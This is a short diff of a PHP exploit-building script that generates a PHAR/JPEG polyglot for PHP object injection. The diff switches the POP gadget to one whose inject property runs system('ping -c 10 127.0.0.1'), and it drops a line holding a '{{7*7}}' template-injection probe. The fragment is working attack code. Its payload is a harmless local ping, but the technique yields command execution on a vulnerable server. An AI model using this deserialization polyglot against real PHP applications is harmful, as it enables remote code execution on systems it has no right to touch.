@@ -35,12 +35,12 @@ function generate_polyglot($phar, $jpeg){
 
 
 // pop exploit class
-// class PHPObjectInjection {}
-// $object = new PHPObjectInjection;
-// $object->inject = 'system("id");';
-// $object->out = 'Hallo World';
+class PHPObjectInjection {}
+$object = new PHPObjectInjection;
+$object->inject = 'system("ping -c 10 127.0.0.1");';
+$object->out = 'Hallo World';
 
-$object = new CustomTemplate(new Blog("abc","{{7*7}}Hello"));
+
 
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
